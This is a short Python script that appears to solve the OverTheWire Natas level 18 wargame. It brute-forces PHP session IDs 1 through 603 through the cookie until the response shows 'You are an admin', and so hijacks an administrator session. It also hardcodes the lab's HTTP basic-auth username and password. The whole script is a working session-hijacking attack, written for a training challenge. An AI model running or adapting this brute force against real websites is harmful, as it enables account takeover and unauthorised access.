import requests
from requests.auth import HTTPBasicAuth

# http basic auth
Auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')


url = "http://natas18.natas.labs.overthewire.org/"
headers = {'content-type': 'application/x-www-form-urlencoded'}
for i in range(1,604):
    cookies =dict(PHPSESSID="{}".format(i))
    r = requests.post(url,auth = Auth,data={"username":"admin","password":"admin"}, cookies=cookies, headers=headers)
    if "You are an admin" in r.text:
        print("got id {}".format(i))
        print(r.text)
        break
    else:
        print("not {}".format(i))
